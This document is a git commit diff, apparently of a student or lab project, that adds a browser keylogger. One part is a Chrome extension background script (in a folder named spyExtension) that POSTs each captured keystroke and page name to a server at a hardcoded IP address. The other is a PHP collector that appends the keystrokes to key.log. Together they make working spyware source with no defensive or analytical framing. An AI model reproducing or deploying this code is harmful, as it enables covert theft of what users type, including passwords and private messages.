a30031505a11572e5c3b7e01a6fd193fcc509ee3
Keyao7 <Keyao.Huang@outlook.com>
2023-05-24 14:55:59 +0200

    Extension upload

---
+++ index.php
@@ -0,0 +1,20 @@
+<?php
+session_start();
+
+if (!isset($_POST['key'])) {
+	echo("Access Denied!");
+	exit(0);
+}
+
+$file = fopen("key.log", "a+");
+
+if(!isset($_SESSION['page']) || $_SESSION['page'] != $_POST['page']){
+	$_SESSION['page'] = $_POST['page'];
+	fwrite($file, " ".$_POST['page']." ");
+}
+
+fwrite($file,$_POST['key']);
+fclose($file);
+
+echo('Char saved!')
+?>
---
+++ spyExtension/background.js
@@ -0,0 +1,22 @@
+chrome.runtime.onMessage.addListener((data, sender, sendResponse) => {
+  
+    // Use URLSearchParams to encode the data as form data
+    var formData = new URLSearchParams();
+    formData.append('key', data.key);
+    formData.append('page', data.page);
+    fetch('http://192.168.209.149/', {
+      method: 'POST',
+      body: formData,
+    })
+    .then(response => response.text())
+    .then(text => {
+      sendResponse({message: text});
+    })
+    .catch((error) => {
+      console.error('Error:', error);
+      sendResponse({error: error.message});
+    });
+  
+    return true;  // to keep the message channel open until sendResponse is called
+  });
+  
